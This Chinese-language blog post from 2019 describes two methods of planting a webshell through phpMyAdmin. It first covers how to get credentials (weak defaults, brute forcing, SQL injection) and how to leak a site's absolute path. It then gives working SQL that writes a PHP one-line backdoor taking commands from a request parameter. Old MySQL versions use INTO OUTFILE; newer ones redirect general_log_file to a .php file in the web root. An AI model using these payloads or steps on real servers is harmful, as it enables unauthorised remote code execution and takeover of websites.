---
layout:     post
title:      phpMyAdmin拿shell的两种方法
subtitle:   phpMyAdmin拿shell
date:       2019-07-13
author:     看不尽的尘埃
header-img: img/post-bg-ios9-web.jpg
catalog: 	 true
tags:
    - phpMyAdmin
---
# 利用前提
## phpMyAdmin用户名和密码
如何获取phpMyAdmin用户名和密码：
* 弱口令
  * root/root
  * root/空密码
  * root/123456
  * ....
* phpMyAdmin爆破工具
* 信息泄露(配置文件等)
* sql注入
* 等等
## 网站绝对路径
如何获取网站的绝对路径呢？
* 单引号爆绝对路径
  * xx.asp?id=1'
* 错误参数值爆绝对路径
  * xx.asp?id=-1
* 搜索引擎搜索绝对路径
  * site:xxx.com error
  * site:xxx.com warning
  * site:xxx.com fatal error
* 测试文件获取绝对路径
  * phpinfo.php
  * test.php
  * ceshi.php
  * info.php
  * php_info.php
* 等等
# 拿shell的两种方法
## 低版本Mysql
Mysql低于5.0，可以直接通过outfile写入：
```
SELECT "<?php @assert($_REQUEST["admin"]);?>" INTO OUTFILE  '<网站绝对路径>'
```

## 高版本Mysql
通过以下SQL语句可以查询secure_file_priv（secure-file-priv是全局变量，指定文件夹作为导出文件存放的地方，这个值是只读的）是否为null：
```
show variables like '%secure%'
```
从下图可以看到我的靶机secure_file_priv值为null：
![图片](../../../../img/phpmyadmin_shell1.png)
通过以下SQL语句可以查询到日志保存状态(ON代表开启 OFF代表关闭)和日志的保存路径：
```
show variables like '%general%'
```
从下图可以看到我的靶机是关闭日志保存的，还有日志保存的路径在哪：
![图片](../../../../img/phpmyadmin_shell2.png)
因此通过以下SQL语句修改general_log的值，开启日志保存：
```
set global general_log='on';
```
通过以下SQL语句修改日志保存的路径(general_log_file值)：
```
SET global general_log_file='<网站绝对路径>/shell.php'
```
再次执行以下SQL语句，查询是否成功更改：
```
show variables like '%general%'
```
从下图可以看到，成功通过SQL语句修改成功了：
![图片](../../../../img/phpmyadmin_shell3.png)
执行以下SQL语句，以下SQL语句将会被写入到日志文件(shell.php)中：
```
SELECT '<?php @assert($_REQUEST["admin"]);?>';
```
从下图可以看到一句话木马写入了日志文件中：
![图片](../../../../img/phpmyadmin_shell4.png)
通过URL访问，成功被执行了！
![图片](../../../../img/phpmyadmin_shell5.png)

